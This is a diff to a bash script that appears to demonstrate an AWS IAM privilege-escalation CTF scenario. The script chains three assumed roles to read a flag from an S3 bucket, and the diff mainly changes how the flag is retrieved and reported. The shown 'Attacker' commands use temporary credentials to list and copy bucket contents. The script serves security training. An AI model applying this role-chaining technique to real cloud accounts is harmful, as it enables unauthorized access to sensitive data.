@@ -183,24 +183,21 @@ AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
     aws s3 ls s3://$S3_BUCKET_NAME --region $REGION
 
-# [EXPLOIT] Step 5: Download and display the flag file
+# [EXPLOIT] Step 5: Read the CTF flag from the target bucket
 echo ""
-echo "🔄 Step 5: Downloading and displaying flag.txt..."
+echo "🔄 Step 5: Reading flag.txt from target bucket..."
 
-show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt /tmp/flag.txt --region $REGION"
-AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $REGION"
+FLAG_VALUE=$(AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
-    aws s3 cp s3://$S3_BUCKET_NAME/flag.txt /tmp/flag.txt --region $REGION
+    aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $REGION)
 
 echo ""
-echo "📄 Flag file contents:"
+echo "📄 Flag:"
 echo "======================"
-cat /tmp/flag.txt
+echo "$FLAG_VALUE"
 echo "======================"
-
-# Clean up the temporary file
-rm -f /tmp/flag.txt
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n\033[1;33mAttack Commands:\033[0m"
@@ -213,12 +210,12 @@ echo ""
 echo "🎉 SUCCESS! Successfully traversed the 3-hop role assumption chain!"
 echo "================================================================"
 echo "📊 Attack Summary:"
-echo "   - Started with profile: $PROFILE"
+echo "   - Started as: $STARTING_USER_NAME"
 echo "   - Assumed initial role: $INITIAL_ROLE_ARN"
 echo "   - Assumed intermediate role: $INTERMEDIATE_ROLE_ARN"
 echo "   - Assumed S3 access role: $S3_ACCESS_ROLE_ARN"
 echo "   - Accessed S3 bucket: $S3_BUCKET_NAME"
-echo "   - Downloaded and displayed flag.txt"
+echo "   - CTF Flag: $FLAG_VALUE"
 echo ""
 echo "💡 This demonstrates a privilege escalation attack through role chaining!"
 echo "   An attacker with minimal permissions can gain access to sensitive S3 data"
